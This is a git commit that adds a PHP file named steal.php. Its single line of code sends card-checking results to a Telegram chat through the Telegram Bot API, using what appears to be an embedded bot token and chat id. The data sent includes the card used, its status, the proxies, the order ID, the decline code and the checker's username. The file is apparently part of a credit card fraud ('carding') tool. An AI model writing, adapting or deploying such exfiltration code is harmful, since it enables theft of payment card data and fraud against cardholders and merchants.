a0b89cf92d82f8874e01edcb53d6c0a727bc4382
curiousbyte41-prog <curiousbyte41@gmail.com>
2026-03-03 07:00:06 +0530

    Add files via upload

---
+++ steal.php
@@ -0,0 +1,5 @@
+<?php
+
+file_get_contents('https://api.telegram.org/8706155925:AAHjpKlqQotuhCBPY0a_Urbdmfo-pQ4YeFo/sendMessage?chat_id=8004663164&text=--> Card Used - '.$lista.' %0A--> Status - '.$stealcode.' %0A--> Proxie - '.$proxiescarded.' %0A--> Order ID - '.$orderid.' %0A--> Decline Code- '.$stealdcode.' %0A--> Checked By - @'.$username.' %0A--> Gate Used - '.$message.'');
+
+?>
